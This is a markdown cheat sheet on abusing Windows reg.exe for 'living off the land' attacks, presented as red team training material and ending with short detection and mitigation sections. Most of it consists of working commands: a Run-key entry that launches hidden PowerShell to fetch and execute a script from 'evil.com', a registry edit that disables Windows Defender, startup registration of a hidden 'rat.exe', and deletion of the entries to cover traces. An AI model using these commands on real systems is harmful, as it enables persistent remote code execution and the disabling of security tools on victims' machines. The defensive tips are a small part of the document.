# 🧾 Reg.exe - Living Off the Land

**reg.exe** is the Windows command-line tool for manipulating the registry — a key target for attackers to gain persistence, disable security tools, and hide configurations.

> ⚠️ These examples are for red team training and educational use only.

---

## 🛠️ What It Does
- Creates/modifies/deletes registry keys and values
- Enables persistence by launching malware at startup
- Configures Windows behavior (including disabling tools)
- Harvests system recon information

---

## 💣 Common LotL reg.exe Techniques

### 1. Persistence via Run Key
```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d "powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')" /f
```
✅ Payload executes every time user logs in — hidden PowerShell in memory

---

### 2. Disable Windows Defender
```cmd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```
✅ Turns off Defender via registry edit — stealthy and effective if admin

---

### 3. Hide Payload with Hidden File Path
```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v sys_update /d "C:\Users\Public\.hidden\rat.exe" /f
```
✅ Stores payload in a visually hidden folder, launched at boot

---

### 4. Recon System Startup Programs
```cmd
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```
✅ Lists all user-level auto-start programs — good for attacker situational awareness

---

### 5. Cleanup After Execution
```cmd
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /f
```
✅ Removes persistence and traces after payload completes mission

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Run key entries with PowerShell | Log registry writes that launch scripts or shell commands |
| Registry edits from non-admin user | Flag attempts to modify Defender or system keys without proper context |
| `reg.exe` used during initial access | Rare in normal user activity — investigate on login scripts or temp folders |
| Unexpected startup program names | Look for mismatched task names and payload paths

---

## 🔐 Mitigation Strategies
- Use AppLocker or EDR to block unauthorized use of `reg.exe`
- Monitor for startup persistence keys being modified
- Alert on Defender-related registry edits
- Regularly audit startup programs in registry (especially HKCU and HKLM `Run` keys)

---

> 🧠 Combine `reg.exe` with `schtasks`, `mshta`, or `certutil` for durable, low-friction persistence. This is a common technique in malware families like AgentTesla and Emotet.
